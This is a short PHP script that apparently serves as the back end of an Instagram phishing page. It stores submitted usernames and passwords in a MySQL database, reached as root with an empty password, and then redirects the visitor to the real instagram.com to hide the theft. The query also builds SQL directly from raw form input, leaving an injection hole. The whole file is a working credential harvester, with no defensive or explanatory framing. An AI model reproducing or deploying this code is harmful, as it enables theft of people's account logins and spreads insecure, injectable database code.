<?php
$name = $_POST['name'];
$pass =$_POST['pass'];

$hosname = "192.168.0.28";
$user = "root";
$password = "";
$db ="sqlmap";

$connect = mysqli_connect($hosname,$user,$password,$db);
mysqli_query($connect,"INSERT INTO `user`(`name`, `pass`) VALUES ('$name','$pass')");

header("Location: https://www.instagram.com/");